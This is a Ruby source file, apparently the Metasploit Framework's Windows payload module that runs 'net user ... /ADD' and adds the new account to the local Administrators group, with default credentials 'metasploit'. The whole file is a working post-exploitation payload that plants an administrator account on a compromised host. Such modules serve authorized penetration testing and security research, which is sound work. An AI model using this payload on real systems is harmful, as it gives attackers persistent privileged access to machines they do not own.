##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/payload/windows/exec'


###
#
# Extends the Exec payload to add a new user.
#
###
module Metasploit3

	include Msf::Payload::Windows::Exec

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Windows Execute net user /ADD',
			'Version'       => '$Revision$',
			'Description'   => 'Create a new user and add them to local administration group',
			'Author'        => 'hdm',
			'License'       => MSF_LICENSE,
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Privileged'    => true))

		# Register command execution options
		register_options(
			[
				OptString.new('USER', [ true, "The username to create",     "metasploit" ]),
				OptString.new('PASS', [ true, "The password for this user", "metasploit" ]),
			], self.class)

		# Hide the CMD option...this is kinda ugly
		deregister_options('CMD')
	end

	#
	# Override the exec command string
	#
	def command_string
		user = datastore['USER'] || 'metasploit'
		pass = datastore['PASS'] || ''

		if(pass.length > 14)
			raise ArgumentError, "Password for the adduser payload must be 14 characters or less"
		end

		return "cmd.exe /c net user #{user} #{pass} /ADD && " +
			"net localgroup Administrators #{user} /ADD"
	end

end
